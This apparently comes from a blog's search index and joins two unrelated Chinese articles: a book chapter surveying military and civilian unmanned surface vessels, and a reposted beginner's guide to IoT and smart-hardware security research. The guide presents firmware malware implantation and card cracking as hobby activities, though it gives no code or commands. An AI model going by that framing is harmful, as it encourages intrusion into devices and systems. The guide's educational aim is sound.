目前，国外无人系统正在快速发展，越来越多的无人系统被研制出并投入实际应用，以降低作战成本，减少作战伤亡。国外诸多舰艇已搭载了部分成熟的无人系统设备或正在对尚未成熟的进行试验，关于这方面的研究，目前美国处于最领先地位。 无人水面艇的雏形最早诞生于二战期间，主要以欺骗性目标和靶艇为主，完全依赖舰员远程遥控操作。20世纪90年代以来，随着战争模式逐渐转向信息化作战，以无人系统为代表的信息化装备进入蓬勃发展期，无人水面艇在反潜、反舰、反水雷、部队保护、反恐等方面的潜能渐渐展露出来，在此背景下出现具有一定自主能力的无人水面艇。2000年以来，随着国外海军不断加大对它的研发力度，该领域取得了丰富的成果。目前，开展无人水面艇研制的主要包括美、以、欧、日等国，各国发展并装备的无人水面艇多为集反水雷战、反潜战、信息/电子战等多种能力于一体的多功能无人水面艇。 ※1、美国处于领先地位，已研制并装备多种型号 美国从1990 年代开始研究无人水面艇，并界定了无人水面艇的一系列标准，美国在无人艇的研发方面始终处于世界领先地位，目前为止已经研发成熟或已应用服役的无人水面艇多达20余型，研究体制完备，发展目标和路线明确，研发产品逐步系列化。美国2007年出台的《海军无人水面艇主计划》主要针对无人水面艇的艇体设计、布放技术、自主/协作能力和负载配置方案等四个领域进行全面系统的研究。在无人水面艇方面，美国始终站在技术发展的制高点，代表着这一领域的发展方向。美国正式服役的USV主要有“海上猫头鹰”、“斯巴达侦察兵”、“X-2”号、“幽灵卫士”、“海狐”等。 “海上猫头鹰”是美海军开发水面无人艇的首次尝试。该艇长3m，最大航速45节（83kmh），续航力为10小时（22km/h航速）或24小时（9km/h艇速），吃水仅18cm，可在近岸非常浅的水域活动。该艇可携200kg的有效载荷，包括前视和侧扫声纳、星光／日光／红外摄像机、激光测距仪等，可由长度11m以上的舰船携载、投放和回收。改进型“海上猫头鹰”可用作载舰侦察艇，为其他武器标示海上或岛礁附近的目标，必要时还可为载舰兵力提供保护，甚至还拥有对水下无人潜航器实施控制的能力。 “斯巴达侦察兵”是美国近年来研制的水面无人艇的典型代表，它是“美国先期技术概念演示项目”之一。该艇针对美国海军的需求，由美国海军水下作战中心、诺格公司、雷声公司以及洛马公司联合研制。海军陆战队用它执行远征后勤和再补给等任务，特种部队认为该艇可用于水文调查或其他侦察和欺骗任务，陆军认为该艇可以配备“地狱火”导弹等武器执行精确打击任务，协助陆军在内陆湖泊地带作战。该艇有两种型号，分别长7m、11m，各自可携带1 360kg、2 360kg的有效负载。其具有遥控和自主运行两种模式，具备半自主能力，能够根据不同的任务需求更换任务模块。2003年8月首次海试，2005年4月首次参加实弹射击试验。已被正式部署到“葛底斯堡号”巡洋舰（CG 64），参加过“持久自由行动”和“伊拉克自由行动”。 同时，该艇也列装在濒海战斗舰上，濒海战斗舰携带配备反水雷模块的“斯巴达侦察兵”无人水面艇以11米长的刚性充气艇为基础，执行远程布放、拖曳、回收猎雷声纳；清查航道，提供海底图像的细节；将视频图像和声纳数据传给反水雷舰，为反水雷舰艇进出港口提供港口护卫；以遥控或半自主的模式作业，并将数据实时传递出去。如图3-8所示，舰队级无人艇样艇也于2014年10月被选为濒海战斗舰的水雷对抗装备，并携带无人感应扫雷系统（UISS）。 美国海军新型三体无人快艇“X-2”号，能够配备雷达、声纳、摄像头、导航系统和防撞系统，还安装有先进的网络通信系统和情报侦察监视系统。X-2号长约15m，宽约12m，能以28～55节（52～102km/h）的航速在8级海浪中自主巡航。通过无线电和全球定位系统，控制人员可以在数百千米外通过控制平台下达指令，从指令发送到无人艇执行动作只需18秒，定位控制精度可达3m以内。 “幽灵卫士”主要用于海上警戒和防护、运送货物（150kg）、收集情报和海上监测等。其最大功率为266马力（196千瓦），可按预定程序自动行驶，并可随时更改航路。该艇于2003年9月首次海试。 “海狐”由美国西风海事公司研发，目前在美国海军中服役的主要有“海狐”MK1和MK2两型，其可搭载雷达、声纳、摄像机、目标跟踪与防抖软件系统、数字变焦红外照相机、数字变焦日光彩色照相机、导航照相机、4个波段（军民各2个）的增强型通信系统。美国海军主要利用该艇进行江河地区的作战评估以及远征部队的安全保障等，2006年首次海试。 2015年夏季，SHARC（搭载传感器的远程无人艇）在美国与澳大利亚联合军演中被用作为海上情报、监视与侦察节点接受测试。2015年秋季开始与P-8A反潜机的联合应用试验，试验包括数个SHARC及其他系统，构成了覆盖水下—水面—空中的网络。 美国无人水面艇的发展思路和顶层规划十分明确和清晰。21世纪初，美国海军在《21世纪海上力量—海军设想》中提出，在2015年前将新型无人平台引入未来网络化作战体系中。2007年7月，美国海军首次发布《海军无人水面艇主计划》，设定了无人水面艇的7项使命任务—反水雷战、反潜战、海上安全、反舰战、支持特种部队作战、电子战、支持海上封锁行动，为美国工业界、学术界和国际合作伙伴指明了未来无人水面艇的发展重点及技术攻关方向。此后，美国军方开始统筹各军种无人系统发展，并统一发布《无人系统综合路线图》，对无人水面艇的作战需求、关键技术领域以及与其他无人系统之间的互联互通性进行了总体规划。 ※2、以色列发展仅次于美国，部分型号已装备部队 以色列由于拥有丰富的无人机研制经验，因此在无人水面艇研制领域独具优势，通过转化先进的无人机技术，研发的无人水面艇处于世界先进行列，产品得到了实际应用并已出口海外。 以色列已开发多种型号，如图3-9和图3-10，包括拉斐尔公司和航空防务系统公司联合开发的“保护者”，拉斐尔公司的“海上骑士”，航空防务系统公司的“海星”和“卡塔娜”，埃尔比特系统公司的“海貂鱼”、“银色马林鱼”和“海鸥”等，其共同特点是充分借鉴无人机技术，并采用模块化设计。其中“保护者”项目开展最早，发展最为成熟，首批12艘于2006年服役以色列海军。而“海上骑士”是“保护者”的升级版，继承了“保护者”的基本装备和高速航行的优点，但其体型更大更长，具有更大的油箱和更大范围的通信功能，在偏远地区也能灵活操作，而且具备了一个突出功能——发射导弹。 ※3. 欧亚多国积极推进研制 英国也有多型在研或已交付使用的无人水面艇，主要包括“快速机动扫雷技术”（FAST）、“海上系统无人快速靶标”（FMTD）、“哨兵”、“FIAC RT”无人目标艇、“C-CAT4多功能型”、“C-Sweep反水雷型”、“Atlas远程综合感应扫雷系统”和“翡翠鸟”（图3-11），其中“翡翠鸟”在C-Sweep的基础上改造而成，专为水雷对抗任务设计，是英法海事水雷对抗项目的一部分。 法国在研或已交付使用型号主要包括“检验者”（MK1/MK2）、Rodeur、Sterenn Du和Catarob T-02，其中“检验者”包括MK1和MK2两种型号，MK2为升级版本，采用双柴油机喷水推进，最高航速达35节（图3-12）。 加拿大在研或已交付使用型号主要包括“萨普尔”、“梭鱼”、“锤头”和“翠鸟”。其中“翠鸟”是加拿大机器人公司开发的一型无人水面艇，能在拒止水域进行长时间的水文研究，是一型可靠且易于使用的无人数据采集系统，可以提高测试重复性，同时降低研究成本，包括M100和M200两种型号（图3-13）。 Delfim是由葡萄牙DSOR（动力系统和海洋机器人实验室）研发的小型自动航行的双体ASV（自动水面船舶），用于与AUV（自动水下船舶）联合作业，执行海洋数据的实时采集和传输。ASV上装有DGPS、USBL（水下定位装置）、高速通信模块以及海洋数据测量设备，在执行任务时，ASV向AUV传输定位数据以供AUV定位，AUV向ASV传输海洋测量数据，ASV再将这些数据传回岸边或者周围的船舶。该项研究由欧盟资助，执行时间是1998年到2000年。 意大利热那亚CNR-ISSIA研究机构研发的Charlie号USV是一艘双体船，主要作用是在南极洲对海洋微表层进行取样和收集大气海洋界面的数据以及在浅水区域探测鱼雷。该船由无刷直流电机驱动，并在船上配备太阳能板。Caccia等对Charlie导航、控制、路径规划和避碰均有研究，并进行了很多相关实验。 日本发展的水面无人艇主要有UMV-H（高速型）、UMV-0（海洋型）和OT-91型。其中，OT-91型为最新研制型号，采用喷水推进，最高航速40节，主要用于海上情报侦察和反水雷等。日本Eco Marine Power公司于2014年5月对外发布了Aquarius无人艇，该艇采用三体船结构，长5m，翼展8m，吃水1m，船体使用轻量级复合铝制材料，采用太阳能和电力混合动力，巡航时速最高6节，非常适合在浅水水域进行操作。 其他国家典型的在研或已交付USV型号还包括：德国的Rheinmetall和Sonobot，意大利的U-Ranger，新加坡的Venus（图3-14），瑞典的SAM 3，丹麦的SAV级，日本的Aquarius等。 国外水面无人艇研制、生产走过了20多年的历程，随着无人化、智能化技术的不断进步，水面无人艇任务领域将不断拓展，型号更趋成熟。如表32，列出了美国、英国、法国、以色列等国家的无人水面艇典型型号名称、开发商及其服役（或研制、试验）年份。 ※2、国内发展现状 21世纪以来，无人水面艇开始受到国内重视，各研究机构纷纷投入力量开展研发工作，已研制出具有一定自主导航控制能力的无人水面艇或样艇。目前，我国从事无人水面艇相关研究的机构主要有中国船舶重工集团公司（简称中船重工集团）、中国科学院沈阳自动化研究所、哈尔滨工程大学、上海大学、海军工程大学、航天新光公司、珠海云洲智能科技有限公司、苏州前卫公司等。国内现有无人水面艇的主要情况如下。 ※1. 中船重工集团 2016年4月，中船重工集团701研究所研发出具有完全自主知识产权的“海翼1号”无人艇。该艇长约6.8 m，宽2.4 m，排水量约2.8 t，最高航速超过35 kn，配备有北斗、惯导、导航雷达、一体化光电系统及超短波无线通信设备。具有自主控制、岸基远程遥控和人工驾驶三种控制模式，具备复杂海情下的自主巡逻、搜索取证功能，主要用于完成海警执法和警戒巡逻等任务。 中船重工集团716研究所研制出新型多用途无人作战艇JARI-USV（图 315）。该艇长约15 m，排水量20 t左右，采用柴油机动力，最大时速78 km/h（约42 kn），续航时间12 h。左右各搭载了一个4联装垂发单元，一次可搭载8枚反舰或防空导弹，再加上其左右各一个的单管鱼雷发生装置以及舰首的30 mm自动火炮，使其能够执行防空、对海以及反潜等多种作战任务，同时还搭载了四面相控阵雷达。 另外，在2017年12月上海国际海事展上，中船重工集团707研究所展示了新型智能无人艇。该艇配备了先进的导航雷达、全球定位系统、红外传感器、摄像头等，能够获取周围的海上图像，搜集情报，进行实时监视，主要用于警用执法、海洋资源调查等任务领域。 ※2. 沈阳自动化研究所 沈阳自动化研究所研制了BQ-01、GZ-01、“先驱号”、“勇士号”等多型无人水面艇。其中BQ-01半潜式无人水面艇（图316）采用柴油机动力，半潜式航行，仅通气管露出水面，耐波性好，具备拖曳拖体航行能力，具备手动遥控、自主航行两种航行模式，主尺度6.1×2.0×1.5米（不含桅杆），桅杆高度5.0米，航行器重量≤4500千克，遥控距离10千米，续航时间24小时/15节，拖曳力10,000牛/10节，最大航速15节，巡航速度10节，可独立使用执行水面情报、监视与侦察（ISR）等任务，也可拖曳拖体作业开展探雷，主要用于海洋石油海管探测等。GZ-01无人跟踪艇具备自主、遥控、人工驾驶三种功能，搭载了多种探测载荷，主要包括导航雷达、激光雷达、夜视仪、超短基线、水下摄像机、水下照相机等。艇长6.6米，艇宽2.5米，排水量3吨，最大航速25节，续航力40小时/15节，100小时/10节，工作海况4级，生存海况6级，主要用于对AUV等水下运动目标进行自主跟踪，采用模块化设计，可加装大气/海洋环境探测等其它任务模块。 2018年10月，第十三届中国大连国际海事展览会在大连举办，沈阳自动化研究所海洋信息技术装备中心“先驱号”无人水面艇、“勇士号”无人水面艇、半潜式无人艇等在海洋智能装备领域的最新科研成果参加展出。“先驱号”无人水面艇可搭载水下摄像机、搜索与导航雷达、激光雷达、红外热像仪等有效载荷。“勇士号”无人水面艇具备人工驾驶、遥控和自主控制三种工作方式，且可相互灵活切换，搭载光电、雷达等传感器，可对视距内水面目标实施自主搜索、识别和决策，对特定目标进行跟踪取证，并具备符合海事规则的自主避碰能力。 ※3. 哈尔滨工程大学 哈尔滨工程大学主要研发两型无人水面艇——6m级和12m级。如图317所示，2009年研制的无人水面艇原理样机具备手操、遥控、半自主和全自主四种工作模式，总长6.5米，最大航程250公里，能在二级海况下稳性航行，具有自扶正功能，可在复杂多障碍物环境下自主避障航行，主要用于海上战区环境侦察、巡逻警戒、抵近侦察。 2017年底，哈尔滨工程大学和深圳海斯比船艇公司联合研制的“天行一号”新型无人艇亮相广东湛江中国海洋经济博览会。该艇使用油电混合动力，全长12.2 m，满载排水量7.5 t，最高航速超过50 kn，最大航程1000 km。可自主航行、多障碍物、动态目标环境下自主避障航行，主要用于海洋水文气象信息采集、海底地形地貌扫描测绘等。 哈尔滨工程大学研制的上述无人水面艇，其最大航速均超过30节，采用玻璃钢全封闭结构，柴油机加喷水推进方式，无人水面艇上安装了可见光及红外光电系统、导航雷达，可见光/红外组合进行近距离障碍物探测，雷达进行远距离探测，上述探测信息用于无人水面艇避碰，其自主导航控制系统可在宽阔低海况海域对静止或低速单一目标进行自主避碰，在给定的电子海图配合下可自主规划从起点到目标点间的路径。 ※4. 上海大学 上海大学针对海洋岛礁、海岸线浅水域海底地形地貌的海图测绘和海洋资源调查等应用，自主研制了“精海”系列无人艇（图318、图319），采用开放式平台系统架构，可方便加载各种传感、侦察、测量等任务载荷。 “精海1号”总长6.28米，满载吃水深度0.43米，续航力120海里，最大航速18节，采用玻璃钢全封闭结构，柴油机加喷水推进方式，具有良好的机动性和抗风浪能力。该艇通过遥控方式进行控制，并初步具备在宽阔海域（运动障碍物较少、障碍物速度低）且低海况下的半自主导航能力，具备20千米内超视距操控、自主定位、远程航路规划、动态航路实时更改、航迹自主跟踪、障碍物自主避碰、多模式无线通信、载荷设备/数据/任务远程管理和实时健康监控等能力，其综合性能满足海事测绘部门在浅滩、暗礁等危险水域的测量工作等需要，可自主完成水体环境的探测和测量，包括水深，水下地形地貌，海洋气候以及海洋水文的测量。 “精海2号”总长8.5米，满载重量4吨，续航力200海里，相对于“精海1号”，该艇主要优化了导航和避障算法，提高了航行精度和设计，增加了低温保护设计，使得无人水面艇满足极端环境下的工作要求，并采用模块化设计，提升安全性、航行精度和升级改装能力，具备人工/遥控/自主控制三模控制功能。该艇是由交通运输部东海航海保障中心订购，主要用于东海、黄海、南海、南极等地任务。2014年，该艇随“雪龙”号极地科考船前往南极进行第31次科考。 “精海3号”按照批量产品进行设计，定位为专业海洋测绘工作，采用高集成模块化设计方式，具备即插即用能力，配置先进的“精海智能避障导航系统”，主要搭载在海洋调查船上，用于岛礁和近海浅水域等水下地形、地貌探测，可对测量船不能到达的水域进行数据测量、采集等工作，也可以作为一个搭载平台，搭载其它设备，完成其它使命（如海洋环境监测等）。该艇由交通运输部东海航海保障中心上海海事测绘中心订购。 “精海4号”主要用于内河航道、湖泊、大型水库的水文信息采集和水底地形地貌勘测，具有自主航行和遥控操作两种运动方式，搭载高清摄像头、激光雷达等环境感知工具。 ※5. 航天新光公司 在2006年的第6届珠海航展上，航天新光公司曾展示过一个概念模型，即XG-2型无人水面艇。经过2年的研发，当初的概念模型已经成为“天象1号”无人水面艇（图320）。该艇曾在2008年北京奥运会青岛奥帆赛期间，作为气象应急装备为奥帆赛提供气象保障服务。“天象1号”无人水面艇上搭载了气象探测系统，是国内第一艘用于工程实践的无人水面艇。 在2006年的第6届珠海航展上，还有一种全新型号的无人水面艇亮相——“闪电”（XG-3）高速探测无人水面艇，如图321。该艇是一种高性能的无人水面艇平台，可在较恶劣条件下进行特定区域的探测、侦察，甚至是小目标攻击等，速度较快，通常情况下航速可达50节，极限情况下航速可超过60节。 ※6. 珠海云洲智能科技有限公司 珠海云洲智能科技有限公司开发了电子对抗无人水面艇，如图322。该艇以舰载7.5米玻璃钢艇为基础，对其进行无人化改造，改造后的无人水面艇可以在有人和无人两种状态下切换，拥有伴航、随航、变航等多种自主航行模式，确保了任务载荷的有效工作。由于任务载荷的需求，需要对船体的稳性重新进行设计、计算、仿真。根据总体以及纵摇、横摇等稳性方面的要求，对各种设备进行了重新布局，加装了相应的配重，并且保证不能对任务载荷造成影响。艇体改造确保了航行的安全，保证了试验的顺利进行。该无人水面艇所有自主控制软硬件设备和与之配套的智能遥控器、控制基站均为公司完全自主研发。 珠海云洲智能科技有限公司还曾于2014年推出一款无人水面艇——“领航者”号（图323），该艇作为一款通用化海洋高速无人船平台，采用M型高速三体船型设计，可在5级海况下航行，主要用于环保监测、科研勘测、水下测绘、搜索救援等领域，目前已经实现了搭载无人机、潜水器实现协同作业。该艇采用油电混合动力系统可提供30节航速，通过岸基遥控台进行遥控控制（图324）。该艇主要特色在于船艇艏部搭载了一架小型四旋翼无人机，能在1000公里范围内通过GPS或者北斗系统实现高精度定位自主航行、自主作业，可进行通信中继及对无人船周边环境进行监控。 近年来，云洲智能把关注点逐渐拓宽向海洋领域和军用技术，成为民营企业“参军”的代表。先后自主研发推出了中国第一艘海洋调查无人艇、隐身无人艇、电子对抗无人艇、协同作战无人艇和导弹无人艇，试图用人工智能变革传统水上作业模式，提高水上作业效率，降低成本，同时增加人员安全性。 ※7. 苏州前卫公司 自2001年5月以来，苏州前卫公司先后研制了QW-1、QW-2、QW-3、QW-5等型无人水面艇。如图325所示，QW-5无人水面艇装备搜索雷达、高清晰CCD转塔、激光测距仪、舰对空攻击、远程遥控火控等系统，是集海面、空中为一体的综合作战平台。以遥控为主，可按设定的航线进行简单的自主航行，包括自动执行预定的任务、自动返回基地，也可以由地面以及母船对它进行修改航线或直接通过无线电进行航行控制、执行不同任务的工作控制。由地面站进行无线电摇控操纵，系统操作方便实用，两名操作人员经过简单培训就可以控制无人水面艇。 ※3、需求和发展差距 综合国内无人水面艇发展情况可知，虽然无人艇研发取得了一定成果，但尚处于起步阶段，工作成果包括部分高校和研究所开展的无人水面艇技术基础研究和功能单一的无人水面艇实艇设计研制。从整体来看，国内无人水面艇发展首要问题是缺乏长期规划，难以推动国内无人水面艇技术的整体发展。从局部来看，由于无人艇的研发涉及自主导航、目标检测和识别、自动驾驶与避障、推进动力控制、传感集成和数据处理等多个领域，而目前的科研院所和生产企业在人才的学科交叉性上有所欠缺，这是造成目前国内研发迟缓的重要原因。 结合国内的技术现状，以及当前我国的军事战略方针，制定适合我军海军战略转型需求的海上无人系统发展规划，并且从发展初步阶段就强调无人水面艇装备发展的标准化、通用化、模块化，结合我国的工业基础制定指导性文件，促进无人水面艇装备的快速有序发展。在无人水面艇研制设计工作中应以需求为向导，优先发展以侦察、收集战场情报、反潜、反水雷为主的无人水面艇。优先考虑在大中型舰船上适装性能优良的产品。在遥控和自主控制技术的研发中，采用多专业领域合作的方式推进无人水面艇核心装备的更新换代。 根据国外无人艇使用情况和我国的海防需求，可以初步得出我国无人艇的用途主要有以下几个方面：信息化作战、反水雷战、反潜作战、海上安全防护、护航和反海盗、战场态势评估等。 无人水面艇属于新兴装备，我国目前装备部队的仅为遥控扫雷艇，主要用于反水雷作战任务，功能较为单一，与国外存在较大差距。相对于国外无人水面艇系列化、模块化、多任务化特点，我国无人水面艇类型及型号单一，任务功能简单，特别在无人水面艇的自主化、高速长航时等方面还有很多核心技术需要突破。综合分析我国在无人水面艇研发的现状，目前存在的技术差距主要表现在： 1）无人水面艇平台偏小（均10米内），且均不带主动减摇功能，航行、载荷能力均较差，仅限于执行良好海况条件下近海、近岸、浅水区域低端的水文测绘、环境监测等任务，具备高海况适航能力的无人水面艇尚属空白，具备搭载拖曳阵等大型设备能力的无人水面艇亦尚属空白。 2）无人水面艇设计沿袭有人小艇设计，艇型、结构设计未能与无人水面艇无需人员保障、极限恶劣环境工作、极限航程航速要求、极限隐蔽性要求、灵活投放回收方式等相结合，水面艇总体设计新概念亟需挖掘。 3）自主航行能力弱。自主障碍物检测识别和规避是无人水面艇可靠工作、智能化应对作业环境的基础，是无人水面艇技术发展的瓶颈。目前国内无人水面艇在自主障碍物检测识别普遍效果不好，对小型、低矮、近距离障碍物检测识别能力不足，对高海况波浪环境和岸线等干扰反应过大，亟需从单一传感器算法检测性能挖掘和雷达、光电、激光、超声等多传感器融合等两个方面探索提高性能的途径，并在目前基于经验和统计的方法基础上，引入基于数据和机器学习的算法，三管齐下，让无人水面艇真正实现自主化。 4）感知数据融合技术弱。目前国外先进技术可以将ARPA 雷达信息、惯导系统、光电设备、GPS 定位和电子海图等多种感知数据进行融合，得到最终所需的数据形式。而国内在数据融合方面还处于研究阶段，离工程应用还有距离。 5）无人水面艇基本根据具体任务进行设计，未能实现开放架构和模块化设计，未能实现无人水面艇平台、基础载荷、任务载荷的模块化分离和设计；同时，满足无人水面艇要求的小型化、高性能任务模块（如小型多功能雷达、小型拖曳阵声纳、小型多功能声纳等）缺乏且相互间不兼容，总体集成效率低下。 6）无人水面艇湖上及海上试验验证环境场地匮乏，无人水面艇平台功能性能试验验证标准尚未建立，艇总体及任务载荷系统设计标准空白。 ※4、美海军无人海上系统采办 美国海军海上系统司令部（NAVSEA）设置了新的组织机构（PEO USC的PMS 406）负责无人海上系统采办。 2018年3月13日，美国海军负责研究、开发与采办的助理部长（ASN (RD&amp;A)）James Geurts 签署备忘录，将原有的濒海战斗舰项目执行办公室（PEO LCS）改名为“无人与小型舰艇”（Unmanned and Small Combatants），即PEO USC。 PEO USC下设多个项目办公室（如表 33），其中PMS 406负责美海军无人海上系统（UMS）的发展、采购、支持等，促进实验和技术成熟以便满足海军舰队的发展需求，包括USV和UUV，以及为完成任务所需的传感器等有效载荷，如图 326所示。 表 33 PEO USC下设办公室的业务范围 -办公室- -名 称- -业务范围- PMS 515 护卫舰 Frigate /FFG(X) - PMS 501 濒海战斗舰 Littoral Combat Ship (LCS) - PMS 505 濒海战斗舰训练 LCS Training - PMS 420 濒海战斗舰任务模块 \\ LCS Mission Modules - PMS 495 水雷战 Mine Warfare - PMS 406 无人海上系统 \\ Unmanned Maritime Systems Ghost Fleet \\MCM USV \\MHUs \\ UISS \\ AN/AQS-20 \\ Knifefish \\ LDUUV \\ MEDUSA \\ XLUUV/AUP PMS 525 国际小型舰艇 \\ International Small Combatants 目录 上篇 海上无人装备体系 第1章 绪论 第2章 海上无人机系统 第3章 无人水面艇 第4章 无人潜航器 第5章 无人水下预置系统 下篇 海上无人系统技术及应用 第6章 海上无人系统关键技术 第7章 海上有人/无人系统协同作战通信技术 第8章 海上有人/无人系统协同决策控制技术 第9章 无人系统装备作战运用分析 第10章 海上无人装备体系发展建议 附录A 缩略语表 附录B 美国国防部无人系统综合路线图（2017—2042）","tags":""},{"title":"智能硬件入门","url":"/20240324/zhi-neng-ying-jian-ru-men/","text":"转载自 智能硬件入门 智能硬件入门 智能硬件目前玩的人相对于玩PC、服务器和移动的人来说要少很多。以前，大部分研究这块的人都是电子行业相关人士，但是目前物联网的流行，使得很多黑客和安全研究人员进入该领域，使得该领域产品安全问题频发。物联网的发展让虚拟网络与现实生活紧密的联系起来，一旦发生安全问题，遭受黑客攻击必将对人们的现实生活环境产生严重的影响和危害，甚至危及到人身安全和生命安全，如车联网的安全问题等等。物联网已然成为未来互联网发展的趋势，那么物联网安全同样也是安全行业发展必不可少一个重要方向。 对于很多未涉足该领域的人，特别是之前从事计算机行业的人来说，感觉这个领域太广，涉及处理器架构也比较多，嵌入式操作系统和非操作系统的也不少，感觉会无从下手，那么本文主要目的就是引导新人入门或者给想要转入该方向的朋友们一个学习参考。当然我个人精力也是有限的，也只能涉足少量的一些方向，目前我也只是以某一方面的学习路线来引导大家尽快入门。对于安全来说，这个领域还比较新，有太多的东西需要学习，后续我会把一些好的技术文章发到该板块，和大家一起讨论学习。一、什么是智能硬件 首先我们要明白智能硬件是什么，明确了概念，才能定位方向，不至于无从着手。智能硬件实际上是智能手机概念的升级，也就是把传统的设备进行升级改造使其具有某种智能，比如电视、冰箱、空调、手表、门锁、茶杯、医疗仪器、玩具、机器人、汽车甚至房子等等。因此智能硬件这块方向比较宽泛，涉及的领域比较广，与此相关的行业也非常非常的多。并不像PC平台那样，我们只需要关心某一类处理器架构，甚至只需要关心某一个操作系统平台就可以。如果要完全列出智能硬件这块的知识架构，可能得写本书也无法列举完全。我们每个人精力是有限的，也不能每一个领域都去涉足，因而我们只需要关心某一个领域或者方向即可。 二、按软件进行分类 根据设备使用的软件系统的不同，我把这些智能硬件分为如下四类： 1.android设备系列，包含智能手机，智能电视，智能手表，连接云的汽车，智能导航设备等等。 2.ios设备系列，主要是苹果系的产品。 3.嵌入式操作系统:嵌入式linux,VxWorks，FreeRTOS，Windows XP Embedded，Windows CE，RTX，uCLinux等等，这一块跟嵌入式操作系统相关。 4.非操作系统(这里特指非智能设备)：如照相机，摄影机，洗衣机，电子玩具，键盘，鼠标，摄像头，话筒等等电子设备，还包括有仪器，电子卡，SIM卡等等。 前两类设备，对于熟悉android和ios的朋友应该问题不大。看雪这两个版块有很多非常好的文章，感兴趣的可以到这两个板块进行学习。这里我主要讲的是后两类设备的入门学习。这两类设备需要嵌入式开发相关的知识和单片机相关的知识作为准备。 对于嵌入式系统大部分都是POSIX标准，这一块儿的入门，大家可以先学习linux，然后学习嵌入式操作系统移植，入门应该不难，对其进行安全研究和逆向分析和传统方式也差不多，毕竟都是基于操作系统的，学习思路很相似，只是逆向这一块儿涉及的汇编会不一样。 对于那些非操作系统类型的设备，安全研究和逆向分析相对来说要难一些，因为这些设备多半都是封闭式或者半封闭式的，基本上都需要拆开封装，分析电路板并对电路板进行测试分析。这方面入门主要以单片机学习来入门会走得更远。我们可以先学习单片机再学习嵌入式，也可以反过来，无所谓。这两个方面都需要了解硬件，只是着重点不同而已。 三、硬件设备怎么玩 由于硬件设备太多，嵌入式系统也不少，太多的设备会导致我们不知道该从何入手。那么首先在我们打算学习之前，需要要弄清楚我们学习的目的是什么，我们的兴趣点是什么，弄清楚这些后我们才有具体的学习目标，这样更有助于我们入门。 目前我们的目标不是去做硬件开发，也不是做嵌入式开发，我们目的是做安全研究和逆向工程，那么我们对于硬件可做哪些呢： 1.挖掘安全弱点：登录验证，弱口令，弱加密，溢出漏洞，固件更新漏洞，敏感信息泄露，不安全的访问控制，嵌入式系统遗留的漏洞等等，这方面目前主要体现在物联网上比较多，实际上是传统安全问题在新领域的复制。 2.开源硬件DIY：开源硬件资料齐全，需要一点硬件方面的知识，但主要考验动手能力和排错能力，比如树莓派（现在大量系统都主动来支持树莓派，特别是3，潜力无限），Ardurino，Atmel Xplained(PRO),CooCox开发工具，伽利略开发板等等；还有专门的机器人开源项目（DFRobot，TurtleBot等），四轴飞行器（3DR Solo，MikroKopter，Crazepony等），3D打印机（Ormerod，Mamba3D，Ultimaker等）等等。 3.固件逆向工程：逆向固件，发现固件级别的安全问题，比如华盛顿大学和加州大学圣地亚哥的研究员通过利用蓝牙固件漏洞获取到了一个汽车远程信息处理单元的远程代码执行权限。 4.固件代码植入：向固件中植入恶意程序,比如方程式组织的硬盘固件病毒，这一块儿可以作为个人兴趣安全研究，比如今年blackhat上有一个议题就是向PLC中植入病毒，大家可以关注一下。 5.固件DIY：国外很多人玩，比如把鼠标改造成扫描仪，将背光键盘改造成贪吃蛇游戏等等，后面我会将这些文章分享出来，介绍分析方法和实现原理。 6.硬件DIY：自己diy硬件，这一块需要你具备硬件方面的知识更多一些，自己设计电路图，自己焊接，需要一些手工技能，这方面该板块后续也会引入一些帖子来介绍方法。 7.破解：比如各种卡的破解等。 四、物联网的机遇 上面介绍的第一种玩法实际上是传统安全的玩法。在物联网时代，当一些原来与网络隔离的设备被加入智能操作系统并接入互联网时，那么传统的安全研究思想和方法又能够再一次的发挥威力。 由于物联网的发展将大量原来漏洞百出的系统暴露在网络中，并且大量从事这些工作核心技术工程师来自于传统嵌入式工程师，安全开发的意识比较缺乏，使得很多低级安全问题出现在物联网设备中，比如各种路由器口令后门，智能电视弱登录验证，遥控器与智能家居的明文通信或者弱加密通信，智能开关与云的弱验证，远程溢出漏洞等等，因而这些设备的安全问题随着物联网的发展而不断暴露。因而这个领域的大量安全问题正等待着大家来发觉，这也是一个新领域的老问题，也是大家该介入的最好时机，不管怎么样，目前物联网安全漏洞是还处于一个非常容易挖掘的时期。 当然在万物互联的大背景下，汽车安全、工业控制安全、POS系统安全，医疗网络安全等等都在成为大家关注的热点问题。当然还有一些比如监控摄像头，ATM机安全，无线通信安全等等。 基本准备： 如果你之前是做渗透测试或者漏洞挖掘，那么基本可以直接测试自己身边智能路由器，智能开关，智能电视等设备，以及控制这些设备的APP. 一些基本知识： 1.熟悉嵌入式操作系统，如linux,VxWorks,FreeRTOS，RTX等，可以自己试图去编译安装这些系统，熟悉一下它们文件系统。 2.学习ARM和MIPS汇编 3.会使用一般的渗透测试工具进行测试，推荐使用Kali系统，装备齐全。 物联网的玩法简单些，无需关心硬件，传统的渗透测试和模糊测试的方法同样适用，更深入点的可以dump出固件，这些固件(嵌入式系统固件)都是以一定格式存放的嵌入式操作系统及其文件系统，只需要提取出其中关心的程序（通常是ARM和MIPS汇编的程序）进行分析来发现安全漏洞。 当然你可以挑选最简单的来玩，比如很多智能家居设备，比如智能开关，智能冰箱，智能电饭煲等等这些智能设备都会支持android和ios进行控制，你可以直接分析测试这些app是否存在一些安全问题。 五、底层硬件入门 如果大家对底层感兴趣，并且让自己能够更加深入的玩下去，那最好是熟悉硬件底层，当然我们没有条件也没有必要去制造那些乱七八糟的设备，但是我们可以拿到一个设备后动手去观察，分析，使用工具去拆解它。那么只要我们愿意去动手，愿意去使用搜索引擎查看电路板的各芯片说明，即便最后没能成功，也能学到不少东西。当然在我们做这些工作之前，还是需要做一些准备工作，我们最好还是把基础打牢固，这样很多看似很难得问题都能迎刃而解了。 1.首先最好学习一下单片机，这是你熟悉硬件的最佳途径，熟悉C语言的做单片机编程真的是非常简单，虽然我们目的不是去编程，但是编程对于我们做逆向分析和了解其运行机制非常有用。最简单的是51单片机，其次是PIC,avr,stm32，从这些编程中，你试着逆向去了解8051指令集，avr指令集以及arm指令集等等。 学习单片机更重要的是去学习与外围设备的通信，接口连线，调试方法等等。 1)外围设备包含LED灯、A/D(D/A)转换器、键盘、数码管、液晶屏、传感器、红外线、无线电、电机等等。 2)接口包含USART、RS232、PCI、SPI、I2C，USB等等. 附件里我会上传一些资源供大家学习。如果你了解了这些，那么基本上就有一定基础了。 当然并不是所有外设你需要完全学会，你可以在研究到相关外设时再查资料学习。你可以把精力放在逆向上，一边写代码一边逆向，了解单片机从加电复位到你自己的代码执行这个期间的过程搞明白。 